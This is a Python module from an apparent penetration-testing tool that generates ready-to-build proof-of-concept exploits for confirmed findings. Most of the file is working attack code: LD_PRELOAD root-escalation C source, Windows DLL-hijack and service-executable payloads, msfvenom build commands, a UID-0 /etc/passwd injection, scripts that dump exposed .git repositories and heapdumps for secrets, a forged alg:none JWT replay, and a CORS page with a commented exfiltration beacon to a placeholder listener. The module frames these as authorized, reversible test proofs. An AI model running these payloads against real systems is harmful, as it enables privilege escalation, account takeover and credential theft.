"""Proof-of-concept build recipes.

"Drop a payload here" isn't actionable without the payload. For a CONFIRMED
finding this emits the EXACT source + build command + delivery for the standard,
documented PoC artifact. Each PoC has a real, provable effect that DEMONSTRATES
the finding (dumps the repo, forges + replays the token, evaluates the template,
reads the exposed secret) and then reverts, and every PoC marks the single ACTION
line where the operator substitutes their ROE-approved command.

Everything is a published technique built with tools Kali ships (gcc, mingw,
msfvenom). Nothing here is obfuscated or AV-evasive: if a security control blocks
a PoC, coordinate an exclusion for the test window (the ROE path) rather than
engineering evasion - recce does not do that.
"""

from __future__ import annotations

import os
import re

MARKER = "recce_poc"        # marker file / throwaway account name used by the proofs


# --- payload sources (proof actions) -------------------------------------

def _c_ld_preload() -> str:
    return (
        "/* recce PoC - LD_PRELOAD / writable-.so / env-injection escalation.\n"
        " * PROOF: elevates, then writes proof to /tmp/recce_poc.txt.\n"
        " * Swap the system() line for your ROE-approved action.\n"
        " * build: gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c */\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void _init(void) {\n"
        "    setgid(0); setuid(0);\n"
        "    system(\"id > /tmp/recce_poc.txt 2>&1\");\n"
        "}\n")


def _sh_root_job() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - runs when a root job (cron / service / PATH-hijacked command) fires.\n"
        "# PROOF: proves root execution. Swap for your ROE action.\n"
        "id > /tmp/recce_poc.txt 2>&1\n")


def _c_win_dll() -> str:
    return (
        "/* recce PoC DLL - proves a hijacked DLL loaded in the target process.\n"
        " * PROOF: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * A real hijack should PROXY the legit exports so the app keeps working.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll */\n"
        "#include <windows.h>\n"
        "#include <stdlib.h>\n"
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {\n"
        "    if (reason == DLL_PROCESS_ATTACH) {\n"
        "        system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n")


def _sh_web() -> str:
    return (
        "#!/bin/sh\n"
        "# recce web PoC - proves a web exposure / dangerous-method finding (reverts).\n"
        "# usage: sh recce_poc_web.sh http://TARGET:PORT\n"
        "U=\"${1:?usage: recce_poc_web.sh http://target:port}\"\n"
        "echo \"[*] exposed .git/HEAD:\"; curl -sk \"$U/.git/HEAD\"\n"
        "echo \"[*] exposed .env:\";     curl -sk \"$U/.env\" | head -3\n"
        "echo \"[*] server-status:\";    curl -sk \"$U/server-status\" | head -3\n"
        "echo \"[*] actuator/env:\";     curl -sk \"$U/actuator/env\" | head -3\n"
        "echo \"[*] prometheus:\";       curl -sk \"$U/metrics\" | head -3\n"
        "echo \"[*] .htpasswd:\";        curl -sk \"$U/.htpasswd\"\n"
        "echo \"[*] crossdomain:\";      curl -sk \"$U/crossdomain.xml\"\n"
        "echo \"[*] graphql introspection:\"; curl -sk -X POST -H 'Content-Type: application/json' "
        "-d '{\"query\":\"{__schema{queryType{name}}}\"}' \"$U/graphql\" | head -c 200; echo\n"
        "echo \"[*] CORS reflect:\";     curl -skI -H 'Origin: https://recce.example' \"$U/\" | grep -i '^access-control-'\n"
        "echo \"[*] SSTI (expect 49):\"; curl -sk \"$U/?rc=recceA%7B%7B7*7%7D%7D\" | grep -o 'recceA49'\n"
        "echo \"[*] allowed methods:\";  curl -skI -X OPTIONS \"$U/\" | grep -i '^allow:'\n"
        "# JWT: decode with  jwt_tool <token> ;  forge alg=none with  jwt_tool <token> -X a\n"
        "echo \"[*] PUT test (writes a marker if enabled):\"\n"
        "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc'; curl -sk \"$U/recce_poc.txt\"; echo\n"
        "# For a confirmed .git:  git-dumper \"$U/.git\" ./loot\n")


def _c_win_exe() -> str:
    return (
        "/* recce PoC exe - proves execution as the service / intercept account.\n"
        " * PROOF: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * For a REAL Windows service use  msfvenom -f exe-service  (it does the SCM\n"
        " * handshake so SCM doesn't kill it); this plain exe suits unquoted-path,\n"
        " * writable-binary and autorun intercepts that just launch a process.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe */\n"
        "#include <stdlib.h>\n"
        "int main(void) {\n"
        "    system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    return 0;\n"
        "}\n")


# --- recipe registry ------------------------------------------------------------
# files : {filename: source}   build : [shell build commands]
# deliver: how to place/trigger it   proof: how to confirm it fired

RECIPES: dict[str, dict] = {
    "ld_preload": {
        "name": "LD_PRELOAD / writable-.so / SUID env-injection -> root",
        "files": {"recce_poc_preload.c": _c_ld_preload()},
        "build": ["gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c"],
        "deliver": "sudo LD_PRELOAD=/tmp/recce_poc.so <allowed-sudo-cmd>   "
                   "(or: echo /tmp/recce_poc.so >> /etc/ld.so.preload  then invoke any SUID, e.g. ping)",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_root_job": {
        "name": "Writable cron / service / PATH-hijack -> root",
        "files": {"recce_poc_root.sh": _sh_root_job()},
        "build": ["chmod +x recce_poc_root.sh"],
        "deliver": "point the writable job at recce_poc_root.sh (or name it as the hijacked command in the "
                   "writable PATH dir); wait for the root job/cron to run it.",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_passwd": {
        "name": "Writable /etc/passwd -> add a UID-0 account",
        "files": {},
        "build": ["openssl passwd -6 'Recce!Poc123'      # copy the hash into the line below"],
        "deliver": "echo 'recce_poc:<hash-from-above>:0:0::/root:/bin/bash' >> /etc/passwd",
        "proof": "su recce_poc  (password Recce!Poc123)  -> id shows uid=0.  REMOVE the line afterwards.",
    },
    "win_service_exe": {
        "name": "Unquoted path / writable service binary / autorun -> SYSTEM",
        "files": {"recce_poc_exe.c": _c_win_exe()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f exe-service -o payload.exe'
            "   # real services (does the SCM handshake)",
            "x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe"
            "   # plain exe for unquoted-path / autorun / writable-binary intercepts",
        ],
        "deliver": "copy payload.exe to the exact plant/overwrite path recce named; "
                   "sc stop <svc> & sc start <svc>  (or wait for the trigger).",
        "proof": "type C:\\recce_poc.txt   -> nt authority\\system",
    },
    "win_dll": {
        "name": "DLL hijack -> code exec in the target (often SYSTEM) process",
        "files": {"recce_poc_dll.c": _c_win_dll()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f dll -o evil.dll',
            "x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll"
            "   # proxy the real exports so the host app keeps working",
        ],
        "deliver": "rename evil.dll to the missing/hijacked DLL recce identified; place it in the writable "
                   "dir; start/restart the target exe/service.",
        "proof": "type C:\\recce_poc.txt   -> the target process's context",
    },
    "web": {
        "name": "Web exposure / dangerous method -> proof requests",
        "files": {"recce_poc_web.sh": _sh_web()},
        "build": ["chmod +x recce_poc_web.sh"],
        "deliver": "sh recce_poc_web.sh http://<target>:<port>",
        "proof": "the fetched .git/.env/actuator content, or the PUT marker echoed back.",
    },
    "win_msi": {
        "name": "AlwaysInstallElevated -> SYSTEM via MSI",
        "files": {},
        "build": ['msfvenom -p windows/x64/exec CMD="net localgroup administrators recce_poc /add" '
                  "-f msi -o recce_poc.msi"],
        "deliver": "msiexec /quiet /qn /i recce_poc.msi",
        "proof": "net localgroup administrators  -> lists recce_poc.  REMOVE it afterwards "
                 "(net localgroup administrators recce_poc /del).",
    },
}


_MATCH = [
    (r"ld_preload|ld\.so\.preload|env-injection|env_keep.*ld_|writable (shared-)?librar|\.so hijack",
     "ld_preload"),
    (r"/etc/passwd is writable|writable /etc/passwd", "linux_passwd"),
    (r"path-hijack|path hijack|writable cron|writable .*timer|writable service unit|runs a writable binary|"
     r"writable root|writable library dir", "linux_root_job"),
    (r"alwaysinstallelevated", "win_msi"),
    (r"exposed (git|\.git|\.env|svn|\.ds_store|aws)|\.env file|mod_status exposed|"
     r"mod_info exposed|actuator|phpinfo|directory listing enabled|dangerous http methods|"
     r"web\.config readable|crossdomain|prometheus /metrics|\.htpasswd|graphql introspection|"
     r"cors reflects|server-side template injection|jwt (accepts|uses)|secret in client-side js|"
     r"backup/source file", "web"),
    (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
     r"writable service registry", "win_service_exe"),
    (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
     r"service binary directory is writable", "win_dll"),
]
_MATCH_C = [(re.compile(p, re.I), k) for p, k in _MATCH]


# --- per-finding web PoCs -------------------------------------------------------
# A tailored, runnable proof for each web finding type, with the target
# URL filled in. RCE escalations reference the published PoC (run in ROE).

_TLS_PORTS = {443, 8443, 9443, 4443, 10443, 5986}


def _url_from_vuln(v) -> str:
    m = re.search(r"https?://[^\s/]+", getattr(v, "output", "") or "")
    if m:
        return m.group(0)
    port = getattr(v, "port", None)
    if not port:
        return f"http://{v.ip}"
    sch = "https" if port in _TLS_PORTS else "http"
    hostport = v.ip if port in (80, 443) else f"{v.ip}:{port}"
    return f"{sch}://{hostport}"


# Every PoC carries this marker: it PROVES the finding, and shows exactly where the
# operator substitutes their authorized action.
_ROE = ("# >>> ROE: this PoC PROVES the finding (unambiguous, then reverts). "
        "Set your authorized ACTION where marked. <<<")


def _p_git(u):
    return ("sh", "#!/bin/sh\n# recce .git PoC - dump the exposed repo and prove secret exposure (read-only).\n"
            + _ROE + "\n# needs: pipx install git-dumper\n"
            f"git-dumper \"{u}/.git\" ./recce_git_loot >/dev/null 2>&1\n"
            "n=$(grep -rinE 'password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY' ./recce_git_loot 2>/dev/null | tee /tmp/recce_git_hits | wc -l)\n"
            "if [ -d ./recce_git_loot ]; then echo \"PROVEN: recovered the repository; ${n} secret-like line(s):\"; head /tmp/recce_git_hits; "
            "else echo 'could not dump .git'; fi\n",
            "dump the source + secrets from the exposed .git")


def _p_cors(u):
    js = (
        "<!-- recce CORS PoC - proves the target reflects our Origin + credentials.\n"
        "     Host on a server you control; open it in a browser logged into the target.\n"
        "     ROE: this only READS the victim's own response - set your ACTION at the marked line. -->\n"
        "<pre id=o>running...</pre>\n<script>\n"
        "fetch(%r, {credentials:'include'}).then(r=>r.text()).then(t=>{\n"
        "  o.textContent = 'PROVEN: read '+t.length+\" bytes of the victim's AUTHENTICATED response:\\n\\n\"+t.slice(0,500);\n"
        "  // ACTION (ROE): exfil to your listener -> navigator.sendBeacon('http://YOUR-LISTENER/', t);\n"
        "}).catch(e=>o.textContent='not exploitable (CORS blocked): '+e);\n</script>\n" % u)
    return ("html", js,
            "open in a logged-in browser: reads the victim's cross-origin authenticated response")


def _p_jwt(u):
    # Stronger proof: forge alg:none, then REPLAY it and show accepted-vs-denied so a
    # CONFIRMED is unarguable in the report.
    body = [
        "#!/usr/bin/env python3",
        "# recce JWT alg:none PoC - forge an unsigned token and prove the server accepts it.",
        _ROE,
        "import base64, json, sys, urllib.request, urllib.error",
        "URL = " + repr(u),
        "tok = sys.argv[1] if len(sys.argv) > 1 else 'PASTE_JWT_HERE'",
        "def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()",
        "def status(bearer):",
        "    hdr = {'Authorization': 'Bearer ' + bearer} if bearer else {}",
        "    try: return urllib.request.urlopen(urllib.request.Request(URL, headers=hdr), timeout=8).getcode()",
        "    except urllib.error.HTTPError as e: return e.code",
        "    except Exception as e: return 'err:' + str(e)",
        "h, p, _ = tok.split('.')",
        "claims = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))",
        "claims['recce_poc'] = True        # ACTION (ROE): set the claim you want to assert",
        'forged = b64u(b\'{"alg":"none","typ":"JWT"}\') + \'.\' + b64u(json.dumps(claims).encode()) + \'.\'',
        "print('forged token   :', forged)",
        "print('no-token status:', status(''))",
        "print('forged  status :', status(forged))",
        "print('PROVEN if the forged status is authorized (e.g. 200) where no-token is 401/403 "
        "-> the server trusted alg:none.')",
    ]
    return ("py", "\n".join(body) + "\n",
            "forge an alg:none token, replay it, and show accepted-vs-denied")


def _p_ssti(u):
    return ("sh", "#!/bin/sh\n# recce SSTI PoC - prove code execution in the template + identify the engine.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "enc(){ python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$1\"; }\n"
            "hit=''\n"
            "for p in 'rc{{7*7}}' 'rc${7*7}' 'rc#{7*7}' 'rc<%=7*7%>'; do\n"
            "  r=$(curl -sk \"$U?rc=$(enc \"$p\")\" | grep -oE 'rc[0-9]+' | head -1)\n"
            "  if [ \"$r\" = 'rc49' ]; then echo \"PROVEN: '$p' evaluated to 49 -> the engine executed our input.\"; hit=\"$p\"; break; fi\n"
            "done\n"
            "[ -z \"$hit\" ] && { echo 'not injectable on ?rc='; exit 0; }\n"
            "s=$(curl -sk \"$U?rc=$(enc \"rc{{7*'7'}}\")\" | grep -oE 'rc[0-9]+' | head -1)\n"
            "[ \"$s\" = 'rc7777777' ] && echo 'engine: Jinja2/Twig (string multiply)'\n"
            "# ACTION (ROE): read-primitive/RCE ->  tplmap -u \"$U?rc=*\"\n",
            "prove template execution (7*7->49) + fingerprint the engine")


def _p_graphql(u):
    return ("sh", "#!/bin/sh\n# recce GraphQL PoC - prove introspection by dumping the schema.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "out=$(curl -sk -X POST -H 'Content-Type: application/json' "
            "-d '{\"query\":\"query{__schema{types{name}}}\"}' \"$U/graphql\")\n"
            "n=$(printf '%s' \"$out\" | grep -o '\"name\"' | wc -l)\n"
            "echo \"PROVEN: introspection returned ${n} schema type(s).\"\n"
            "printf '%s' \"$out\" | python3 -m json.tool 2>/dev/null | head -40\n",
            "dump the GraphQL schema (proves introspection is on)")


def _p_heapdump(u):
    return ("sh", "#!/bin/sh\n# recce Actuator heapdump PoC - download memory and prove secret exposure.\n"
            + _ROE + "\n"
            f"curl -sk \"{u}/actuator/heapdump\" -o recce_heap.hprof\n"
            "n=$(strings recce_heap.hprof 2>/dev/null | grep -icE 'password|secret|token|jdbc:|api[_-]?key')\n"
            "echo \"PROVEN: heapdump downloaded; ${n} secret-like string(s). Sample:\"\n"
            "strings recce_heap.hprof 2>/dev/null | grep -iE 'password|secret|token|jdbc:' | sort -u | head -20\n",
            "download the heapdump and surface in-memory secrets")


def _p_methods(u):
    return ("sh", "#!/bin/sh\n# recce HTTP PUT PoC - prove a write primitive, then clean up.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "code=$(curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc' -o /dev/null -w '%{http_code}')\n"
            "body=$(curl -sk \"$U/recce_poc.txt\")\n"
            "if [ \"$body\" = 'recce_poc' ]; then echo \"PROVEN: PUT stored a file we read back (HTTP $code).\"; "
            "else echo \"PUT not writable (HTTP $code).\"; fi\n"
            "# ACTION (ROE): upload your authorized file instead of the marker.\n"
            "curl -sk -X DELETE \"$U/recce_poc.txt\" -o /dev/null   # cleanup\n",
            "PUT a marker file, read it back, then DELETE it")


def _p_download(u):
    return ("sh", "#!/bin/sh\n# recce exposed-file PoC - fetch the file and prove secret exposure (read-only).\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "b=$(curl -sk \"$U\")\n"
            "echo \"PROVEN: fetched $(printf '%s' \"$b\" | wc -c) byte(s) from $U\"\n"
            "printf '%s' \"$b\" | grep -iE 'password|secret|api[_-]?key|token|aws_access|BEGIN .*PRIVATE KEY' | head -10\n"
            "printf '%s' \"$b\" | head -20\n",
            "fetch the exposed file and show its (secret) contents")


def _p_js_secret(u):
    return ("sh", "#!/bin/sh\n# recce JS-secret PoC - extract the hardcoded key from the client-side script.\n"
            + _ROE + "\n"
            f"keys=$(curl -sk \"{u}\" | grep -oE 'AIza[0-9A-Za-z_-]{{35}}|AKIA[0-9A-Z]{{16}}|sk_live_[0-9A-Za-z]+|"
            "gh[pousr]_[0-9A-Za-z]{36}|-----BEGIN [A-Z ]*PRIVATE KEY-----' | sort -u)\n"
            "if [ -n \"$keys\" ]; then echo 'PROVEN: extracted key(s):'; echo \"$keys\"; else echo 'no key found'; fi\n"
            "# ACTION (ROE): validate the key against its API to confirm it is live.\n",
            "extract the hardcoded key from the JS file")


_WEB_POC = {
    "web-git": _p_git, "web-gitconfig": _p_git,
    "web-cors": _p_cors, "web-jwt": _p_jwt, "web-ssti": _p_ssti,
    "web-graphql": _p_graphql, "web-actuator-heapdump": _p_heapdump,
    "web-methods": _p_methods, "web-js-secret": _p_js_secret,
    "web-dotenv": _p_download, "web-aws": _p_download, "web-htpasswd": _p_download,
    "web-backup": _p_download, "web-actuator-env": _p_download,
    "web-actuator-configprops": _p_download, "web-metrics": _p_download,
    "web-serverstatus": _p_download, "web-serverinfo": _p_download,
    "web-phpinfo": _p_download,
}


def web_pocs_for_host(host) -> list[tuple]:
    """Per-web-finding PoC artifacts for a host: [(filename, content, note)],
    deduped by (script_id, port). Tailored to each finding, URL filled in."""
    out: list[tuple] = []
    seen: set[tuple] = set()
    for v in getattr(host, "vulns", []) or []:
        if getattr(v, "source", "") != "web":
            continue
        builder = _WEB_POC.get(v.script_id)
        if not builder:
            continue
        key = (v.script_id, v.port)
        if key in seen:
            continue
        seen.add(key)
        ext, content, note = builder(_url_from_vuln(v))
        fname = f"poc_{v.script_id}_{host.ip}_{v.port or 0}.{ext}"
        out.append((fname, content, note))
    return out


def recipe_key_for(text: str) -> str | None:
    for rx, k in _MATCH_C:
        if rx.search(text or ""):
            return k
    return None


def select_for_host(host) -> dict[str, dict]:
    """The applicable PoC recipes for a host's CONFIRMED findings, keyed by id."""
    keys: list[str] = []
    texts: list[str] = []
    from . import qod
    for v in getattr(host, "vulns", []) or []:
        if qod.is_visible(v):          # single QoD authority (was: confidence != potential)
            texts.append(f"{v.title} {v.output}")
    for f in getattr(host, "local_findings", []) or []:
        texts.append(f.get("vector", ""))
    for t in texts:
        k = recipe_key_for(t)
        if k and k not in keys:
            keys.append(k)
    return {k: RECIPES[k] for k in keys}


def write_files(poc_dir: str, recipes: dict, written: set | None = None) -> list[str]:
    """Write each recipe's source files into poc_dir (deduped via `written`).
    Returns the list of file paths written this call."""
    os.makedirs(poc_dir, exist_ok=True)
    written = written if written is not None else set()
    out: list[str] = []
    for r in recipes.values():
        for fname, content in r.get("files", {}).items():
            if fname in written:
                continue
            written.add(fname)
            path = os.path.join(poc_dir, fname)
            with open(path, "w") as fh:
                fh.write(content)
            out.append(path)
    return out


def plan_lines(recipes: dict) -> list[str]:
    """Commented reference block (build -> deliver -> proof) for a host script."""
    if not recipes:
        return []
    lines = [
        "# ======================================================",
        "# PoC BUILD RECIPES (proofs - swap the ACTION for your ROE command)",
        "# Source files are in ./poc/ ; nothing here is obfuscated or AV-evasive.",
        "# ======================================================",
    ]
    for r in recipes.values():
        lines.append(f"#   {r['name']}")
        for f in r.get("files", {}):
            lines.append(f"#     source : poc/{f}")
        for b in r["build"]:
            lines.append(f"#     build  : {b}")
        lines.append(f"#     deliver: {r['deliver']}")
        lines.append(f"#     proof  : {r['proof']}")
        lines.append("#")
    return lines
